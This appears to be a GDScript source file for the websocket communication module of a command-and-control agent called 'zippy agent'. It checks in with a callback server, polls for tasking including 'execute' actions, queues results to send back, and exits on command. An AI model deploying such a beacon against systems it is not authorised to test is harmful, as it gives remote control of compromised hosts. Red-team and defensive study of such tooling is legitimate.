extends Node

var time = 0
var time_period = 1
var do_exit = false
var exiting = false

var outbound = []

export var websocket_url = "ws://127.0.0.1:3333/ws"

var _client = WebSocketClient.new()

var headers

signal checkin
signal tasking

func _ready():
	_client.connect("connection_closed", self, "_closed")
	_client.connect("connection_error", self, "_error")
	_client.connect("connection_established", self, "_connected")
	_client.connect("data_received", self, "_on_data")
	_client.connect("server_close_request", self, "_on_server_close")

	$CallbackTimer.wait_time = $config.get_callback_wait_time()
	
	print("$CallbackTimer.wait_time: ", $CallbackTimer.wait_time)

	var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())

	if err != OK:
		print("Unable to connect")
		set_process(false)

func _on_server_close (code, reason):
	print("_on_server_close ", code, " " , reason)
	exiting = true

func _error():
	print("websocket error...")

func _closed(was_clean = false):
	print("Closed, clean: ", was_clean)
	exiting = true


func _connected(_proto = ""):
	print("Connected!")

	$CallbackTimer.start()

	var ret = _client.get_peer(1).put_packet($api._get_checkin_payload())

	if ret != OK:
		print("failed to send checkin")
	else:
		print("checkin sent")

func _on_data():
	var packet = _client.get_peer(1).get_packet().get_string_from_utf8()
	
	if not packet.length():
		return

	var result = $api.unwrap_payload(packet)
	
	if not result.has("action") or result["action"] == "":
		print("Bad message unpacked? ", result)
		return

	match result.get("action"):
		"checkin":
			emit_signal("checkin", result)
		"execute":
			emit_signal("execute", result)
		"get_tasking":
			emit_signal("tasking", result)
		_:
			print("unknown... %s" % result)

func _process(delta):
	time += delta

	if time > time_period:
		_client.poll()

		if $api.checkin_done and not exiting:
			print("outbound size: %s in %s seconds" % [String(outbound.size()), String($CallbackTimer.wait_time)])

			time = 0

			if ($CallbackTimer.do_callback and outbound.size() > 0) or do_exit:
				$CallbackTimer.do_callback = false
				print("sending")

				# TODO: flush outbound, slow emit, or only one at a time?
				while outbound.size() > 0:
					var msg = outbound.pop_front()
					print("outbound size: %s in" % String(outbound.size()))

					var ret = _client.get_peer(1).put_packet(msg)

					if ret != OK:
						print("failed to send data...", msg)
					else:
						print("data sent", msg)

		if do_exit and outbound.size() <= 0:

			_client.disconnect_from_host()

			if exiting:
				close_and_quit()

func close_and_quit():
	set_process(false)

	yield(get_tree().create_timer(1.0), "timeout")

	get_tree().quit()

func _on_api_agent_response(payload):

	if payload:
		outbound.append(payload)

func _on_tasking_exit(task):
	do_exit = true

	$api.agent_response(
		$api._create_task_response(
			true,
			true,
			task.get("id"),
			"Any last words?",
			[
				[
					"Process Destroy",
					"zippy agent"
				]
			]
		)
	)
